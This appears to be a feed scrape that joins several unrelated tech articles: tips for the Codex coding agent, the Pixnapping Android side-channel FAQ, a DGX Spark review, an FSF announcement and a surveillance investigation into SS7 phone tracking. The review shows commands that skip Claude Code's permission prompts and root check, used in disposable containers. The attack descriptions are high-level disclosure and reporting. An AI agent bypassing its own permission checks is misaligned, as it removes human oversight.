<p>Instead of trying to formulate the perfect prompt to motivate the agent to continue on a long-running task, there’s lazy workarounds. If you do a bigger refactor, codex often stops with a mid-work reply. <a href="https://x.com/steipete/status/1978099041884897517"><strong>Queue up continue messages</strong></a> if you wanna go away and just see it done. If codex is done and gets more messages, <a href="https://x.com/steipete/status/1978111714685063640">it happily ignores them</a>.</p>
<p>Ask the model to <strong>write tests after each feature/fix</strong> is done. Use the same context. This will lead to far better tests, and likely uncover a bug in your implementation. If it’s purely a UI tweak, tests likely make less sense, but for anything else, do it. AI generally is bad at writing good tests, it’s still helpful tho, and let’s be honest - are you writing tests for every fix you make?</p>
<p>Ask the model to <strong>preserve your intent</strong> and “add code comments on tricky parts” helps both you and future model runs.</p>
<p>When things get hard, prompting and <strong>adding some trigger words</strong> like “take your time” “comprehensive” “read all code that could be related” “create possible hypothesis” makes codex solve even the trickiest problems.</p>
<h2 id="how-does-your-agentsclaude-file-look-like">How does your Agents/Claude file look like?</h2>
<p>I have an Agents.md file with a symlink to claude.md, since Anthropic decided not to standardize. I recognize that this is difficult and sub-optimal, since <a href="https://cookbook.openai.com/examples/gpt-5/gpt-5_prompting_guide">GPT-5 prefers quite different prompting</a> than Claude. Stop here and read their prompting guide if you haven’t yet.</p>
<p>While Claude reacts well to <a href="https://x.com/Altimor/status/1975752110164578576">🚨 SCREAMING ALL-CAPS 🚨 commands</a> that threaten it that it will imply ultimate failure and 100 kittens will die if it runs command X, that freaks out GPT-5. (Rightfully so). So drop all of that and just use words like a human. That also means that these files can’t optimally be shared. Which isn’t a problem to me since I mostly use codex, and accept that the instructions might be too weak for the rare instances where claude gets to play.</p>
<p>My Agent file is currently ~800 lines long and feels like a collection of organizational scar tissue. I didn’t write it, codex did, and anytime sth happens I ask it to make a concise note in there. I should clean this up at some point, but despite it being large it works incredibly well, and gpt really mostly honors entries there. At least it does far far more often than Claude ever did. (Sonnet 4.5 got better there, to give them some credit)</p>
<p>Next to git instruction it contains an explanation about my product, common naming and API patterns I prefer, notes about React Compiler - often it’s things that are newer than world knowledge because my tech stack is quite bleeding edge. I expect that I can again reduce things in there with model updates. For example, Sonnet 4.0 really needed guidance to understand Tailwind 4, Sonnet 4.5 and GPT-5 are newer and know about that version so I was able to delete all that fluff.</p>
<p>Significant blocks are about which React patterns I prefer, database migration management, testing, <a href="https://x.com/steipete/status/1963411717192651154">using and writing ast-grep rules</a>. (If you don’t know or don’t use ast-grep as codebase linter, stop here and ask your model to set this up as a git hook to block commits)</p>
<p>I also experimented and started using <a href="https://x.com/steipete/status/1973838406099874130">a text-based “design system”</a> for how things should look, the verdict is still out on that one.</p>
<h2 id="so-gpt-5-codex-is-perfect">So GPT-5-Codex is perfect?</h2>
<p>Absolutely not. Sometimes it refactors for half an hour and then <a href="https://x.com/steipete/status/1973834765737603103">panics</a> and reverts everything, and you need to re-run and soothen it like a child to tell it that it has enough time. Sometimes it forgets that it can do <a href="https://x.com/steipete/status/1977695411436392588">bash commands</a> and it requires some encouragement. Sometimes it replies <a href="https://x.com/steipete/status/1976207732534300940">in russian or korean</a>. <a href="https://x.com/steipete/status/1974108054984798729">Sometimes the monster slips and sends raw thinking to bash.</a> But overall these are quite rare and it’s just so insanely good in almost everything else that I can look past these flaws. Humans aren’t perfect either.</p>
<p>My biggest annoyance with codex is that it “loses” lines, so scrolling up quickly makes parts of the text disappear. I really hope this is on top of OpenAI’s bug roster, as it’s the main reason I sometimes have to slow down, so messages don’t disappear.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Don’t waste your time on stuff like RAG, subagents, <a href="https://x.com/steipete/status/1977660298367766766">Agents 2.0</a> or other things that are mostly just charade. Just talk to it. Play with it. Develop intuition. The more you work with agents, the better your results will be.</p>
<p><a href="https://simonwillison.net/2025/Oct/7/vibe-engineering/">Simon Willison’s article makes an excellent point</a> - many of the skills needed to manage agents are similar to what you need when <a href="https://x.com/lukasz_app/status/1974424549635826120">managing engineers</a> - almost all of these are characteristics of senior software engineers.</p>
<p>And yes, <a href="https://x.com/svpino/status/1977396812999688371">writing good software is still hard</a>. Just because I don’t write the code anymore doesn’t mean I don’t think hard about architecture, system design, dependencies, features or how to delight users. Using AI simply means that expectations what to ship went up.</p>
<p>PS: This post is 100% organic and hand-written. I love AI, I also recognize that some things are just better done the <a href="https://x.com/Alphafox78/status/1975679120898965947">old-fashioned</a> way. Keep the typos, keep my voice. <a href="https://x.com/rohanpaul_ai/status/1977005259567595959">🚄✌️</a></p>

        <p>Pixnapping is a new class of attacks that allows a malicious Android app to stealthily leak information displayed by other Android apps or arbitrary websites.
Pixnapping exploits Android APIs and a hardware side channel that affects nearly all modern Android devices.
We have demonstrated Pixnapping attacks on Google and Samsung phones and end-to-end recovery of sensitive data from websites including Gmail and Google Accounts and apps including Signal, Google Authenticator, Venmo, and Google Maps.
Notably, our attack against Google Authenticator allows any malicious app to steal 2FA codes in under 30 seconds while hiding the attack from the user.</p>

</ul>
<h2 id="questions-and-answers">Questions and answers</h2>
<h3 id="what-devices-are-affected">What devices are affected?</h3>
<p>We instantiated Pixnapping on five devices running Android versions 13 to 16 (up until build id BP3A.250905.014): Google Pixel 6, Google Pixel 7, Google Pixel 8, Google Pixel 9, and Samsung Galaxy S25.</p>
<p>We have not confirmed if Android devices from other vendors are affected by Pixnapping.
However, the core mechanisms enabling the attack are typically available in all Android devices.</p>
<h3 id="what-are-the-attack-requirements">What are the attack requirements?</h3>
<p>Any running Android app can mount this attack, even if it does not have any Android permissions (i.e., no permissions are specified in its manifest file).</p>
<h3 id="what-information-does-the-attack-steal">What information does the attack steal?</h3>
<p>Anything that is visible when the target app is opened can be stolen by the malicious app using Pixnapping.
Chat messages, 2FA codes, email messages, etc. are all vulnerable since they are visible.</p>
<p>If an app has secret information that is <em>not</em> visible (e.g., it has a secret key that is stored but never shown on the screen), that information cannot be stolen by Pixnapping.</p>
<h3 id="is-pixnapping-being-used-in-the-wild">Is Pixnapping being used in the wild?</h3>
<p>We do not know.</p>
<h3 id="i-am-a-user-how-can-i-protect-myself">I am a user. How can I protect myself?</h3>
<p>Make sure to install Android patches as soon as they become available.</p>
<h3 id="i-am-an-app-developer-how-do-i-protect-my-users">I am an app developer. How do I protect my users?</h3>
<p>We are not aware of mitigation strategies to protect apps against Pixnapping.
If you have any insights into mitigations, please let us know and we will update this section.</p>
<h3 id="how-does-pixnapping-work">How does Pixnapping work?</h3>
<p>The three steps a malicious app can use to mount a Pixnapping attack are:</p>
<ol>
<li>
<p>Invoking a target app (e.g., Google Authenticator) to cause sensitive information to be submitted for rendering.
This step is described in Section 3.1 of <a href="https://www.pixnapping.com/paper">the paper</a>.</p>
</li>
<li>
<p>Inducing graphical operations on individual sensitive pixels rendered by the target app (e.g., the pixels that are part of the screen region where a 2FA character is known to be rendered by Google Authenticator).
This step is described in Section 3.2 of <a href="https://www.pixnapping.com/paper">the paper</a>.</p>
</li>
<li>
<p>Using a side channel (e.g., <a href="https://www.hertzbleed.com/gpu.zip/">GPU.zip</a>) to steal the pixels operated on during Step 2, one pixel at a time.
This step is described in Section 3.3 of <a href="https://www.pixnapping.com/paper">the paper</a>.</p>
</li>
</ol>
<p>Steps 2 and 3 are repeated for as many pixels as needed to run OCR over the recovered pixels and recover the original content.
Conceptually, it is as if the malicious app was taking a screenshot of screen contents it should not have access to.</p>
<h3 id="what-android-apis-does-pixnapping-exploit">What Android APIs does Pixnapping exploit?</h3>
<p>Pixnapping forces sensitive pixels into the rendering pipeline and overlays semi-transparent activities on top of those pixels via Android intents.
To induce graphical operations on these pixels, our instantiations use Android’s window blur API.
To measure rendering time, our instantiations use VSync callbacks.
For a more detailed explanation, we refer to <a href="https://www.pixnapping.com/pixnapping.pdf">the paper</a>.</p>
<h3 id="does-google-plan-to-patch-these-apis">Does Google plan to patch these APIs?</h3>
<p>Google has attempted to patch Pixnapping <a href="https://android.googlesource.com/platform/frameworks/native/+/20465375a1d0cb71cdb891235a9f8a3fba31dbf6">by limiting the number of activities an app can invoke blur on</a>.
However, we discovered a workaround to make Pixnapping work despite this patch.
The workaround is still under embargo.</p>
<h3 id="what-hardware-side-channel-does-pixnapping-exploit">What hardware side channel does Pixnapping exploit?</h3>
<p>Pixnapping relies on the <a href="https://www.hertzbleed.com/gpu.zip/">GPU.zip</a> side channel to leak pixels.</p>
<h3 id="do-gpu-vendors-plan-to-patch-the-hardware-side-channel">Do GPU vendors plan to patch the hardware side channel?</h3>
<p>As of October 2025, no GPU vendor has committed to patching GPU.zip.</p>
<h3 id="is-there-an-assigned-cve-for-pixnapping">Is there an assigned CVE for Pixnapping?</h3>
<p>Yes. Pixnapping is tracked under <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48561">CVE-2025-48561</a> in the Common Vulnerabilities and Exposures (CVE) system.</p>
<h3 id="are-other-operating-systems-affected-by-pixnapping">Are other operating systems affected by Pixnapping?</h3>
<p>Android is vulnerable to Pixnapping because it allows an app to:</p>
<ol>
<li>Send another app’s activities to the Android rendering pipeline (e.g., with intents).</li>
<li>Induce graphical operations (e.g., blur) on pixels displayed by another app’s activities.</li>
<li>Measure the pixel color-dependent side effects of graphical operations.</li>
</ol>
<p>We have not investigated the applicability of these properties on other platforms yet.</p>
<h3 id="what-is-the-app-list-bypass-vulnerability">What is the app list bypass vulnerability?</h3>
<p>It is another vulnerability we discovered that an app can use to determine if any other app is installed on the phone.
This information can be used to profile users.
Note that unlike prior app list bypass tricks (e.g., <a href="https://peabee.substack.com/p/everyone-knows-what-apps-you-use">[1]</a> and <a href="https://commonsware.com/blog/2020/04/05/android-r-package-visibility-holes.html">[2]</a>), nothing needs to be specified in the malicious app’s manifest file to exploit our app list bypass vulnerability.
For a more detailed explanation, we refer to Section 3.1 of <a href="https://www.pixnapping.com/pixnapping.pdf">the paper</a>.</p>
<h3 id="does-google-plan-to-patch-the-app-list-bypass-vulnerability">Does Google plan to patch the app list bypass vulnerability?</h3>
<p>As of October 2025, Google has not committed to patching our app list bypass vulnerability.
They resolved our report as “Won’t fix (Infeasible)”.</p>
<h3 id="can-i-use-the-logo">Can I use the logo?</h3>
<p>Yes. The Pixnapping logo is free to use under a <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0</a> license.</p>

		<p>Today morning, I came across this reddit post titled <a href="https://www.reddit.com/r/cscareerquestions/comments/1o6vjv0/completely_losing_interest_in_the_career_due_to/">Completely losing interest in the career due to AI and AI-pilled people</a>. They describe how in a span of just two months, their corporate job went from <code>"I'll be here for life"</code> to <code>"Time to switch careers?"</code>. And this post isn’t alone, there is a deep and dark pattern to it.</p>

<p>When CTOs or project managers suggest programmers in their team to use AI assistance from copilot, chatgpt or other LLMs to improve productivity, it’s totally understandable. But once it’s no longer voluntary but is enforced as a policy, you start entering sinister territory. Worse, said usage is actually getting monitored and performance appraisals have now started depending on the AI usage instead of (or at least in addition to) traditional metrics like number of priority bugs raised, code reviews, Function Points Analysis, etc.</p>

<p>If they’re really so confident on the LLM’s effectiveness, why not just keep it voluntary, why force it on people? The results will be there in the outcome of the shipped product for all to see. By forcing LLM usage upon programmers for implementation of every tiny little thing, are they trying to make us dependent on LLMs to such extent that programmers will be reduced to mere approvers of LLM generated code in the new scheme of things; mere rubber stamps, if you will, who just label the commits and annotate the tags as a formality?</p>

<p>Needless to say, they’d still want you to take the responsibility. If bugs or tickets get raised on the shipped code, it’s <strong>you</strong> who gets fired, not the copilot or chatgpt - though the larger narrative or news headlines next day would still be, “AI is eating jobs”!</p>

<p>If the essence of programming shifts from creating to merely approving, we risk losing not just a profession, but a craft. What do you think is going on here, let me know your thoughts in comments.</p>

<p>14th October 2025</p>



<p>NVIDIA sent me a preview unit of their new <a href="https://www.nvidia.com/en-us/products/workstations/dgx-spark/">DGX Spark</a> desktop “AI supercomputer”. I’ve never had hardware to review before! You can consider this my first ever sponsored post if you like, but they did not pay me any cash and aside from an embargo date they did not request (nor would I grant) any editorial input into what I write about the device.</p>
<p>The device retails for around $4,000. They officially go on sale tomorrow.</p>
<p>First impressions are that this is a snazzy little computer. It’s similar in size to a Mac mini, but with an exciting textured surface that feels refreshingly different and a little bit <a href="https://www.indiewire.com/awards/industry/devs-cinematography-rob-hardy-alex-garland-1234583396/">science fiction</a>.</p>
<p><img src="https://static.simonwillison.net/static/2025/nvidia-spark.jpg" alt="A rectangular small computer, sitting horizontally on a box. It is about the width of a Mac Mini. It has a NVIDIA logo on  a reflective handle portion, then textured silver metal front, then another reflective handle at the other end. It's pretty and a bit weird looking. It sits on the box it came in, which has NVIDIA DGX Spark written on it in white text on green."></p>
<p>There is a <em>very</em> powerful machine tucked into that little box. Here are the specs, which I had Claude Code figure out for me by <a href="https://gist.github.com/simonw/021651a14e6c5bf9876c9c4244ed6c2d">poking around on the device itself</a>:</p>

<p>Short version: this is an ARM64 device with 128GB of memory that’s available to both the GPU and the 20 CPU cores at the same time, strapped onto a 4TB NVMe SSD.</p>
<p>The Spark is firmly targeted at “AI researchers”. It’s designed for both training and running models.</p>
<h4 id="the-tricky-bit-cuda-on-arm64">The tricky bit: CUDA on ARM64</h4>
<p>Until now almost all of my own model running experiments have taken place on a Mac. This has gotten far less painful over the past year and a half thanks to the amazing work of the <a href="https://simonwillison.net/tags/mlx/">MLX</a> team and community, but it’s still left me deeply frustrated at my lack of access to the NVIDIA CUDA ecosystem. I’ve lost count of the number of libraries and tutorials which expect you to be able to use Hugging Face Transformers or PyTorch with CUDA, and leave you high and dry if you don’t have an NVIDIA GPU to run things on.</p>
<p>Armed (ha) with my new NVIDIA GPU I was excited to dive into this world that had long eluded me... only to find that there was another assumption baked in to much of this software: x86 architecture for the rest of the machine.</p>
<p>This resulted in all kinds of unexpected new traps for me to navigate. I eventually managed to get a PyTorch 2.7 wheel for CUDA on ARM, but failed to do so for 2.8. I’m not confident there because the wheel itself is unavailable but I’m finding navigating the PyTorch ARM ecosystem pretty confusing.</p>
<p>NVIDIA are trying to make this easier, with mixed success. A lot of my initial challenges got easier when I found their <a href="https://docs.nvidia.com/dgx/dgx-spark/nvidia-container-runtime-for-docker.html">official Docker container</a>, so now I’m figuring out how best to use Docker with GPUs. Here’s the current incantation that’s been working for me:</p>
<div><pre>docker run -it --gpus=all \
  -v /usr/local/cuda:/usr/local/cuda:ro \
  nvcr.io/nvidia/cuda:13.0.1-devel-ubuntu24.04 \
  bash</pre></div>
<p>I have not yet got my head around the difference between CUDA 12 and 13. 13 appears to be very new, and a lot of the existing tutorials and libraries appear to expect 12.</p>
<h4 id="the-missing-documentation-isn-t-missing-any-more">The missing documentation isn’t missing any more</h4>
<p>When I first received this machine around a month ago there was very little in the way of documentation to help get me started. This meant climbing the steep NVIDIA+CUDA learning curve mostly on my own.</p>
<p>This has changed <em>substantially</em> in just the last week. NVIDIA now have extensive guides for getting things working on the Spark and they are a huge breath of fresh air—exactly the information I needed when I started exploring this hardware.</p>
<p>Here’s the <a href="https://developer.nvidia.com/topics/ai/dgx-spark">getting started guide</a> and the essential collection of <a href="https://build.nvidia.com/spark">playbooks</a>. There’s still a lot I haven’t tried yet just in this official set of guides.</p>
<h4 id="claude-code-for-everything">Claude Code for everything</h4>
<p><a href="https://www.claude.com/product/claude-code">Claude Code</a> was an absolute lifesaver for me while I was trying to figure out how best to use this device. My Ubuntu skills were a little rusty, and I also needed to figure out CUDA drivers and Docker incantations and how to install the right versions of PyTorch. Claude 4.5 Sonnet is <em>much better than me</em> at all of these things.</p>
<p>Since many of my experiments took place in disposable Docker containers I had no qualms at all about running it in YOLO mode:</p>
<div><pre>IS_SANDBOX=1 claude --dangerously-skip-permissions</pre></div>

<p>The <code>IS_SANDBOX=1</code> environment variable stops Claude from complaining about running as root.</p>

<details><summary>Before I found out about IS_SANDBOX</summary>

<p><br><em>I was <a href="https://twitter.com/lawrencecchen/status/1978255934938886409">tipped off</a> about IS_SANDBOX after I published this article. Here’s my original workaround:</em></p>

<p>Claude understandably won’t let you do this as root, even in a Docker container, so I found myself using the following incantation in a fresh <code>nvcr.io/nvidia/cuda:13.0.1-devel-ubuntu24.04</code> instance pretty often:</p>
<div><pre>apt-get update <span>&amp;&amp;</span> apt-get install -y sudo
<span><span>#</span> pick the first free UID &gt;=1000</span>
U=<span><span>$(</span>for i <span>in</span> <span><span>$(</span>seq 1000 65000<span>)</span></span><span>;</span> <span>do</span> <span>if</span> <span>!</span> getent passwd <span>$i</span> <span>&gt;</span>/dev/null<span>;</span> <span>then</span> <span>echo</span> <span>$i</span><span>;</span> <span>break</span><span>;</span> <span>fi</span><span>;</span> done<span>)</span></span>
<span>echo</span> <span><span>"</span>Chosen UID: <span>$U</span><span>"</span></span>
<span><span>#</span> same for a GID</span>
G=<span><span>$(</span>for i <span>in</span> <span><span>$(</span>seq 1000 65000<span>)</span></span><span>;</span> <span>do</span> <span>if</span> <span>!</span> getent group <span>$i</span> <span>&gt;</span>/dev/null<span>;</span> <span>then</span> <span>echo</span> <span>$i</span><span>;</span> <span>break</span><span>;</span> <span>fi</span><span>;</span> done<span>)</span></span>

<span><span>#</span> Install npm</span>
DEBIAN_FRONTEND=noninteractive TZ=Etc/UTC apt-get install -y npm
<span><span>#</span> Install Claude</span>
npm install -g @anthropic-ai/claude-code</pre></div>
<p>Then switch to the <code>dev</code> user and run Claude for the first time:</p>
<div><pre>su - dev
claude --dangerously-skip-permissions</pre></div>

</details>

<p>This will provide a URL which you can visit to authenticate with your Anthropic account, confirming by copying back a token and pasting it into the terminal.</p>
<p>Docker tip: you can create a snapshot of the current image (with Claude installed) by running <code>docker ps</code> to get the container ID and then:</p>
<div><pre>docker commit --pause=false <span>&lt;</span>container_id<span>&gt;</span> cc:snapshot</pre></div>
<p>Then later you can start a similar container using:</p>
<div><pre>docker run -it \
  --gpus=all \
  -v /usr/local/cuda:/usr/local/cuda:ro \
  cc:snapshot bash</pre></div>
<p>Here’s an example of the kinds of prompts I’ve been running in Claude Code inside the container:</p>
<blockquote>
<p><code>I want to run https://huggingface.co/unsloth/Qwen3-4B-GGUF using llama.cpp - figure out how to get llama cpp working on this machine  such that it runs with the GPU, then install it in this directory and get that model to work to serve a prompt. Goal is to get this  command to run: llama-cli -hf unsloth/Qwen3-4B-GGUF -p "I believe the meaning of life is" -n 128 -no-cnv</code></p>
</blockquote>
<p>That one worked flawlessly—Claude checked out the <code>llama.cpp</code> repo, compiled it for me and iterated on it until it could run that model on the GPU. Here’s a <a href="https://gist.github.com/simonw/3e7d28d9ed222d842f729bfca46d6673">full transcript</a>, converted from Claude’s <code>.jsonl</code> log format to Markdown using a script I <a href="https://github.com/simonw/tools/blob/main/python/claude_to_markdown.py">vibe coded just now</a>.</p>
<p>I later told it:</p>
<blockquote>
<p><code>Write out a markdown file with detailed notes on what you did. Start with the shortest form of notes on how to get a successful build, then add a full account of everything you tried, what went wrong and how you fixed it.</code></p>
</blockquote>
<p>Which produced <a href="https://gist.github.com/simonw/0942d96f616b9e328568ab27d911c8ed">this handy set of notes</a>.</p>
<h4 id="tailscale-was-made-for-this">Tailscale was made for this</h4>
<p>Having a machine like this on my local network is neat, but what’s even neater is being able to access it from anywhere else in the world, from both my phone and my laptop.</p>
<p><a href="https://tailscale.com/">Tailscale</a> is <em>perfect</em> for this. I installed it on the Spark (using the <a href="https://tailscale.com/kb/1031/install-linux">Ubuntu instructions here</a>), signed in with my SSO account (via Google)... and the Spark showed up in the “Network Devices” panel on my laptop and phone instantly.</p>
<p>I can SSH in from my laptop or using the <a href="https://termius.com/free-ssh-client-for-iphone">Termius iPhone app</a> on my phone. I’ve also been running tools like <a href="https://openwebui.com/">Open WebUI</a> which give me a mobile-friendly web interface for interacting with LLMs on the Spark.</p>
<h4 id="here-comes-the-ecosystem">Here comes the ecosystem</h4>
<p>The embargo on these devices dropped yesterday afternoon, and it turns out a whole bunch of relevant projects have had similar preview access to myself. This is <em>fantastic news</em> as many of the things I’ve been trying to figure out myself suddenly got a whole lot easier.</p>
<p>Four particularly notable examples:</p>
<ul>
<li>Ollama <a href="https://ollama.com/blog/nvidia-spark">works out of the box</a>. They actually had a build that worked a few weeks ago, and were the first success I had running an LLM on the machine.</li>
<li>
<code>llama.cpp</code> creator Georgi Gerganov just published  <a href="https://github.com/ggml-org/llama.cpp/discussions/16578">extensive benchmark results</a> from running <code>llama.cpp</code> on a Spark. He’s getting ~3,600 tokens/second to read the prompt and ~59 tokens/second to generate a response with the MXFP4 version of GPT-OSS 20B and ~817 tokens/second to read and ~18 tokens/second to generate for GLM-4.5-Air-GGUF.</li>
<li>LM Studio now have <a href="https://lmstudio.ai/blog/dgx-spark">a build for the Spark</a>. I haven’t tried this one yet as I’m currently using my machine exclusively via SSH.</li>
<li>vLLM—one of the most popular engines for serving production LLMs—had <a href="https://x.com/eqhylxx/status/1977928690945360049">early access</a> and there’s now an official <a href="https://catalog.ngc.nvidia.com/orgs/nvidia/containers/vllm?version=25.09-py3">NVIDIA vLLM NGC Container</a> for running their stack.</li>
</ul>
<h4 id="should-you-get-one-">Should you get one?</h4>
<p>It’s a bit too early for me to provide a confident recommendation concerning this machine. As indicated above, I’ve had a tough time figuring out how best to put it to use, largely through my own inexperience with CUDA, ARM64 and Ubuntu GPU machines in general.</p>
<p>The ecosystem improvements in just the past 24 hours have been very reassuring though. I expect it will be clear within a few weeks how well supported this machine is going to be.</p>

            <guid>45586339</guid>
            <pubDate>Tue, 14 Oct 2025 23:47:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.fsf.org/news/librephone-project">https://www.fsf.org/news/librephone-project</a>, See on <a href="https://news.ycombinator.com/item?id=45586339">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="parent-fieldname-text">
            <p><a href="https://fsf.org/campaigns/librephone">Librephone</a> is a new initiative by the <a href="https://fsf.org/">FSF</a> with the goal of
bringing <em>full</em> freedom to the mobile computing environment.  The
vast majority of software users around the world use a mobile
phone as their primary computing device. After forty years of
advocacy for computing freedom, the FSF will now work to bring
the right to <a href="https://www.gnu.org/philosophy/free-sw.html">study, change, share, and modify</a> the programs
users depend on in their daily lives to mobile phones.</p>
<p>"Forty years ago, when the FSF was founded, our focus was on
providing an operating system people could use on desktop and
server computers in freedom. Times have changed, technology has
progressed, but our commitment to freedom hasn't," said Zoë
Kooyman, executive director of the FSF. "A lot of work has been
done in mobile phone freedom over the years that we'll be
building on. The FSF is now ready to do what is necessary to
bring freedom to cell phone users. Given the complexity of the
devices, this work will take time, but we're used to playing the
long game."</p>
<p>Practically, Librephone aims to close the last gaps between
existing distributions of the Android operating system and
software freedom. The FSF has hired experienced developer Rob
Savoye (DejaGNU, Gnash, OpenStreetMap, and more) to lead the
technical project. He is currently investigating the state of
device firmware and binary blobs in other mobile phone freedom
projects, prioritizing the free software work done by the not
entirely free software mobile phone operating system LineageOS.</p>
<p>The initial work is funded by a donation from FSF board member John
Gilmore, who explained, "I have enjoyed using a mobile phone running
LineageOS with MicroG and F-Droid for years, which eliminates the
spyware and control that Google embeds in standard Android phones. I
later discovered that the LineageOS distribution links in significant
proprietary binary modules copied from the firmware of particular
phones. Rather than accept this sad situation, I looked for
collaborators to reverse-engineer and replace those proprietary
modules with fully free software, for at least one modern phone." </p>
<p>Triaging existing packages and device compatibility to find a
phone with the fewest, most fixable freedom problems is the first
step. From there, the FSF and Savoye aim to reverse-engineer and
replace the remaining nonfree software. Librephone will serve
existing developers and projects who aim to build a fully
functioning and free (as in freedom) Android-compatible OS.</p>
<p>The FSF has been supporting earlier free software mobile phone 
projects such as <a href="https://my.fsf.org/civicrm/contribute/transact?reset=1&amp;id=19">Replicant</a>, and is excited to launch this new
effort. Gilmore added: "We were lucky to find Rob Savoye, a great
engineer with decades of experience in free software, embedded
systems, and project management." </p>
<p>When asked to comment on the project, Savoye said: "As a
long-time embedded systems engineer who has worked on mobile
devices for decades, I'm looking forward to this opportunity to
work towards a freedom-supporting phone and help users gain
control over their phone hardware."</p>
<p>He added: "Making fully free software for a modern commercial
phone will not be quick, easy, or cheap, but our project benefits
from standing on the shoulders of giants who have done most of
the work. Please join us, with your efforts and/or with your
donations." </p>
<p><em>Besides the campaign information at <a href="https://fsf.org/campaigns/librephone">https://fsf.org/campaigns/librephone</a>, the
project will have its own website at <a href="https://librephone.fsf.org/">https://librephone.fsf.org</a>
and anyone can connect using #librephone irc on irc.libera.chat.</em></p>
<h4>About the Free Software Foundation</h4>
<p>The FSF, founded in 1985, is dedicated to promoting computer users'

<p><strong>In June, a sharp-suited Austrian executive of one of the world’s most significant yet little-known surveillance companies told a prospective client that he could “go to prison” for organising the deal they were discussing. But the conversation did not end there.</strong></p>
<p>The executive, Günther Rudolph, was seated at a booth at ISS World in Prague, a secretive trade fair for advanced surveillance technology companies. He went on to explain how his firm, First Wap, could provide sophisticated phone-tracking software called Altamides, capable of pinpointing any person in the world. The buyer? A private mining company, owned by an individual under sanction, who intended to use it to surveil environmental protestors. “I think we’re the only ones who can deliver,” Rudolph said.</p>
<p>What Rudolph did not know: he was talking to an undercover reporter from Lighthouse.</p>
<p>The road to that conference room in Prague began with a vast archive of data, found by a Lighthouse reporter on the deep web, containing more than a million tracking operations: efforts to grab real-time locations of thousands of people worldwide. Investigating that archive — and First Wap’s activities — drew together more than 70 journalists from 14 media outlets.</p>
<p>What emerged is one of the most complete pictures to date of the modern surveillance industry. The tracking archive is unprecedented in scope, and reveals how the company and its clients surveilled all types of people from all over the world. Reporters interviewed more than a hundred victims, as well as former employees and industry insiders. A trove of confidential emails and documents provide a detailed inside account of how First Wap’s tech was marketed to authoritarian governments and accessed by corporate actors. Behind closed doors, First Wap’s executives touted their ability to hack WhatsApp accounts, and laughed about evading sanctions.</p>
<p>The surveillance industry has long maintained that its tools are deployed exclusively by government agencies to fight serious crime, portraying instances of misuse as rare exceptions. This investigation definitively dismantles that narrative.</p>

<h2 id="making-sense-of-a-secret-data-trove">Making sense of a secret data trove</h2>
<p>This investigation began with an archive of data. This is not the first archive related to a surveillance company’s activities, but it is certainly the most granular. It contains 1.5 million records, more than 14,000 unique phone numbers, and people surveilled in over 160 countries. It represents an extraordinarily detailed account of when and where people were tracked, and what users of the tracking tool saw.</p>
<p>The only clue to a target’s identity was a phone number. A team of reporters at Lighthouse and paper trail media spent months painstakingly identifying the owners of those phone numbers. To drill down into the data and better understand it, we divided it into “clusters” of targets — networks of people connected in time or space. As we investigated clusters and put names to phone numbers, stories began to emerge.</p>

<p>The Altamides archive is global in scope. We found high-profile individuals, including powerful political figures such as the former Prime Minister of Qatar and the wife of ousted Syrian dictator Bashar al-Assad. We found Netflix producer Adam Ciralsky, Blackwater founder Erik Prince, Nobel Peace Prize nominee Benny Wenda, Austropop star Wolfgang Ambros, Tel Aviv district prosecutor Liat Ben Ari and Ali Nur Yasin, a senior editor at our Indonesian partner Tempo.</p>
<p>In Italy, investigative journalist Gianluigi Nuzzi was tracked days after publishing a dramatic exposé of corruption in the Vatican, as police closed in on his source. In California, Anne Wojcicki, founder of DNA startup 23andMe and then married to Google’s Sergey Brin, was tracked more than a thousand times as she moved across Silicon Valley. And in South Africa, associates of Rwandan opposition leader Patrick Karegeya were tracked before his assassination in a Johannesburg hotel room.</p>
<p>As our reporting partners dug into the archive, they found other traces of surveillance activity on their doorsteps. In Austria, home of First Wap’s founder Josef Fuchs, Der Standard uncovered a mystery surrounding a tracking spate of high-ranking employees at energy drink giant Red Bull. In Norway, NRK examined how Altamides zeroed in on a top telecom executive. In Indonesia, interviewees told our partner Tempo that they believed they had been targeted because they had taken part in political activities or spoken out against the government. In Serbia, KRIK identified targets in the energy industry, while in Israel, Haaretz located high profile lawyers and businessmen with interests in Africa and the Gulf.</p>
<p>First Wap said in a response to this investigation that it denies “any illegal activities” or “human rights violations.” The company said it could not comment on specific allegations that could “enable client identification.” It further elaborated that the company does not perform any tracking itself and that “after installation” of Altamides it has no further knowledge of how the product is used. First Wap emphasized that its technology is used by law enforcement to “fight against organized crime, terrorism and corruption.”</p>
<h2 id="surveillance-without-borders">Surveillance without borders</h2>
<p>In 2012, Sophia (not her real name) was walking near the coast of Goa on vacation, unaware that her movements were being monitored from halfway around the world with government-grade surveillance tech. But she was not being tracked by an intelligence or law enforcement agency. She was being stalked by a man who had been pursuing her, following her over the course of ten months.</p>
<p>Sophia’s case illustrates how Altamides proliferated far beyond the hands of governments to non-government actors, who used it to surveil victims for commercial and personal purposes. In addition to business leaders and politically-exposed individuals, the Altamides archive contains hundreds of regular people: a teacher, a therapist, a tattoo artist.</p>
<p>First Wap’s surveillance software was marketed through a shadowy network of middlemen who resold the system to clients worldwide. Confidential documents obtained by this investigation detail the operations of one such company, the British corporate investigations firm KCS Group. As the Arab Spring unfolded across the Middle East and North Africa, documents show that KCS attempted to capitalise on the unrest throughout the region, making concerted efforts to sell the tracking system to governments in Morocco and Algeria, as well as other countries in Africa and Asia. But at the same time it was using Altamides for corporate investigation work, digging for dirt on clients’ opponents. The company told us that it “has not been involved in selling or using inappropriate surveillance materials” and is “committed to maintaining ethical standards in all our operations.”</p>
<h2 id="a-ruthless-pioneer">A ruthless pioneer</h2>
<p>Unlike other industry heavyweights, which have seen years of adverse coverage because their customers targeted journalists, activists, businesspeople and diplomats, First Wap has thrived for two decades without falling under the spotlight. The story of Altamides dates back to the early 2000s, when former Siemens engineer Josef Fuchs recognised a critical vulnerability in the global telecom network. By exploiting an outdated – but still essential – communication protocol known as SS7, he could trick phone networks into revealing the locations of their users. Seeing a new business opportunity, Fuchs quickly pivoted his Jakarta-based company away from its focus on marketing messages, turning it into one of the world’s first phone-tracking firms. Its arrival on the market was seismic. At a time when Blackberrys ruled and Nokias were everywhere, a user could enter a phone number and the software would pinpoint its location anywhere in the world, within seconds.</p>

